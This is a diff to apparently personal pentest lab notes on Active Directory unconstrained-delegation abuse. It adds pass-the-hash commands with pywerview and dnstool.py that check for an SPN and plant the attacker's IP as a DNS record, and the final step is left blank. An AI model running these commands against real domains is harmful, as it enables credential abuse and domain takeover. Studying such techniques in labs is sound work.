@@ -644,5 +644,24 @@ impacket-findDelegation 'papa.local/delegation_user'  -dc-ip 192.168.130.136  -h
 ```bash
 addspn -u papa.local\\delegation_user -p 'aad3b435b51404eeaad3b435b51404ee:4a5d8fb255b44f32cf2831a488b3afb1' -s papa.local/delegated_user.papa.local --target-type samname 192.168.130.136
 ```
+<img width="1908" height="188" alt="image" src="https://github.com/user-attachments/assets/558fdb38-95e3-4b33-a613-640f98fd2eff" />
+
+- Testing SPN existence with `pywerview`-:
+
+```bash
+pywerview get-netuser -d papa.local -u delegation_user --hashes 'aad3b435b51404eeaad3b435b51404ee:4a5d8fb255b44f32cf2831a488b3afb1' -t 192.168.130.136 --unconstrained
+```
+
+<img width="1713" height="811" alt="image" src="https://github.com/user-attachments/assets/43324c19-a46a-4c8c-badd-db7653b6d310" />
+
+- Add attacker's ip to DNS entries, make sure the `-r` is the new spn
+
+```bash
+python3 dnstool.py -u papa.local\\delegation_user -p 'aad3b435b51404eeaad3b435b51404ee:4a5d8fb255b44f32cf2831a488b3afb1' -r delegated_user.papa.local -a add --allow-multiple -d 192.168.130.132 192.168.130.136
+```
+<img width="1871" height="191" alt="image" src="https://github.com/user-attachments/assets/4c76fbeb-092a-433f-bb2c-a0d9b3d4bc99" />
+
+
+- 
 
 -----------------
